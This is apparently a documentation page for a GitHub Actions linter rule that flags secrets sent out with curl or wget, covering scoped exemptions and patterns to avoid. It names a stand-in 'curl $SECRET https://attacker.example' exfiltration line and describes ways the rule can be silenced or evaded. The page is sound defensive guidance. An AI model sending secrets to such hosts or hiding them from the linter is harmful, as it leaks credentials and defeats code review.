# secret-exfiltration

A `${{ secrets.X }}`-derived environment variable is sent to a network destination via `curl`, `wget`, or similar. The rule fires `critical` regardless of destination — there is currently no way to express "this host is the legitimate API for this secret."

Upstream feature request: https://github.com/sisaku-security/sisakulint/issues/473

## Decision tree

1. **Can the curl be replaced with a provider action / Terraform / API SDK?**
   Prefer this. The provider tooling generally already redacts headers and the rule does not fire on `uses:` calls.

2. **Is this a one-off bootstrap call (import existing resources, seed a queue, etc.)?**
   Delete the job after the bootstrap is complete. Workflow files live forever; a one-shot job should not.

3. **Is the destination genuinely the only thing this secret can talk to (i.e. the secret is a vendor API token and the destination is that vendor's own API host)?**
   Use the workflow-level allowlist below as a documented exception.

## Workflow-level allowlist (current workaround)

Until `allowed-hosts` lands, pass `-ignore secret-exfiltration` via the `args` input on a workflow whose only purpose is calling the trusted host. Scope this to one workflow file so the rule still protects every other workflow.

```yaml
# .github/workflows/sisakulint.yml
- uses: sisaku-security/sisakulint-action@<sha>
  with:
    args: -ignore "secret-exfiltration"
```

```yaml
# .github/workflows/deploy.yml — comment justifying the exemption
# secret-exfiltration is allow-listed at the action layer:
# only destination is api.example.com, which is the legitimate
# API for $VENDOR_API_TOKEN. See sisakulint.yml.
- run: |
    curl -H "Authorization: Bearer $VENDOR_API_TOKEN" \
      "https://api.example.com/v1/resources"
  env:
    VENDOR_API_TOKEN: ${{ secrets.VENDOR_API_TOKEN }}
```

### Caveats

- `-ignore` matches on `err.Type` (the rule ID), not the destination host. Any future `curl $SECRET` to a different host in the same workflow is also silenced. Keep the workflow narrow — single-purpose deploy/import jobs are a good fit; general "ci.yml" is not.
- The `args` value is parsed POSIX-style after sisakulint-action `v1.0.0`. Quoted forms work: `-ignore "secret-exfiltration"`.
- Add a code comment naming the trusted host. Reviewers can spot a new `curl $SECRET https://attacker.example` line because the host no longer matches the documented allowlist.

## Patterns to avoid

```yaml
# DON'T — disables the rule for the entire repo
# .github/sisakulint.yaml
ignored-rules: [secret-exfiltration]
```

```yaml
# DON'T — hides the curl behind a script the linter can't see
- run: bash scripts/sync.sh
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
```

The second pattern silences the rule but is worse: the curl is now invisible to PR review, and a future edit to `sync.sh` won't re-trigger the linter.
